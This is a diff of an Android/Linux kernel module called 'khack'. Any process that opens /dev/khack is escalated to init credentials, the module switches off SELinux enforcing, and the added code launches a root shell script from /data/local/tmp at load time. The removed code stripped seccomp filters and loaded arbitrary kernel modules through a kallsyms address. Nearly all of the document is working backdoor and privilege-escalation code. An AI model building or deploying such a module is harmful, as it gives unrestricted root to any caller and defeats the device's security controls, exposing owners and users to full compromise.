@@ -16,9 +16,6 @@
 #include <linux/kernel.h>
 #include <linux/miscdevice.h>
 #include <linux/fs.h>
-#include <linux/vmalloc.h>
-#include <linux/file.h>
-#include <linux/seccomp.h>
 #include <linux/errno.h>
 #include <linux/mm.h>
 #include <linux/string.h>
@@ -99,74 +96,6 @@ static int khack_clear_enforcing(void)
 }
 
 /* open("/dev/khack") -> caller's creds become init_cred */
-/* seccomp cannot be removed from userspace, but the task that opens the node
- * is ours to fix: drop the filter so the escalated process can load modules
- * without an adb shell. */
-static void khack_drop_seccomp(void)
-{
-	struct task_struct *t = current;
-
-	if (t->seccomp.mode == SECCOMP_MODE_FILTER) {
-		t->seccomp.filter = NULL;
-		t->seccomp.mode = SECCOMP_MODE_DISABLED;
-		pr_info("khack1: seccomp cleared for pid %d\n", t->pid);
-	}
-}
-
-static unsigned long klname_addr;
-module_param(klname_addr, ulong, 0644);
-MODULE_PARM_DESC(klname_addr, "address of kallsyms_lookup_name from /proc/kallsyms");
-
-typedef unsigned long (*klname_fn)(const char *);
-static klname_fn p_klname;
-typedef unsigned long (*cfu_fn)(void *to, const void __user *from, unsigned long n);
-static cfu_fn p_cfu;
-
-/* Load a module from kernel context: no seccomp, no adb shell.
- * Writing a path to /dev/khack triggers it. */
-static long khack_load_ko(const char *path)
-{
-	struct file *f;
-	int fd, ret;
-	typedef int (*finit_fn)(int fd, const void __user *uargs, int flags);
-	finit_fn finit;
-
-	if (!p_klname) {
-		pr_err("khack1: klname_addr not set\n");
-		return -ENOSYS;
-	}
-	finit = (finit_fn)p_klname("__do_sys_finit_module");
-	if (!finit)
-		finit = (finit_fn)p_klname("do_finit_module");
-	if (!finit)
-		return -ENOSYS;
-
-	f = filp_open(path, O_RDONLY, 0);
-	if (IS_ERR(f))
-		return PTR_ERR(f);
-	fd = get_unused_fd_flags(O_RDONLY);
-	if (fd < 0) { filp_close(f, NULL); return fd; }
-	fd_install(fd, f);
-	ret = finit(fd, NULL, 0);
-	ksys_close(fd);
-	pr_info("khack1: load %s -> %d\n", path, ret);
-	return ret;
-}
-
-static ssize_t khack_write(struct file *file, const char __user *ubuf,
-			   size_t len, loff_t *off)
-{
-	char path[256];
-	size_t n = len < sizeof(path) - 1 ? len : sizeof(path) - 1;
-
-	if (!p_cfu || p_cfu(path, ubuf, n))
-		return -EFAULT;
-	path[n] = 0;
-	if (n && path[n - 1] == '\n')
-		path[n - 1] = 0;
-	return khack_load_ko(path) ?: (ssize_t)len;
-}
-
 static int khack_open(struct inode *inode, struct file *file)
 {
 	void *cred;
@@ -179,13 +108,11 @@ static int khack_open(struct inode *inode, struct file *file)
 		return -ENOMEM;
 
 	p_commit_creds(cred);
-	khack_drop_seccomp();
 	pr_info("khack1: caller escalated to init_cred\n");
 	return 0;
 }
 
 static const struct file_operations khack_fops = {
-	.write = khack_write,
 	.owner = THIS_MODULE,
 	.open  = khack_open,
 };
@@ -209,13 +136,6 @@ static int __init khack_init(void)
 		return -ENOENT;
 	}
 
-	p_cfu = (cfu_fn)__symbol_get("__arch_copy_from_user");
-	if (!p_cfu)
-		p_cfu = (cfu_fn)__symbol_get("_copy_from_user");
-	if (klname_addr) {
-		p_klname = (klname_fn)klname_addr;
-		pr_info("khack1: klname=%px\n", p_klname);
-	}
 	khack_clear_enforcing();
 
 	ret = misc_register(&khack_dev);
@@ -224,10 +144,25 @@ static int __init khack_init(void)
 		return ret;
 	}
 
-	pr_info("khack1: BUILD 2026-10-24-umh pid=%d\n", current->pid);
 	pr_info("khack1: loaded, open /dev/khack to escalate\n");
 
+	/* Start the su gatekeeper from init context: nothing else can bring a
+	 * root daemon up without an already-rooted caller. */
+	{
+		typedef int (*umh_fn)(char *path, char **argv, char **envp, int wait);
+		umh_fn umh = (umh_fn)__symbol_get("call_usermodehelper");
 
+		if (umh) {
+			static char *argv[] = { "/system/bin/sh",
+						"/data/local/tmp/dfroot_boot.sh", NULL };
+			static char *envp[] = { "PATH=/system/bin:/system/xbin",
+						"HOME=/", NULL };
+			umh("/system/bin/sh", argv, envp, 1);
+			pr_info("khack1: started dfroot_boot.sh\n");
+		} else {
+			pr_info("khack1: call_usermodehelper unavailable\n");
+		}
+	}
 	return 0;
 }
 
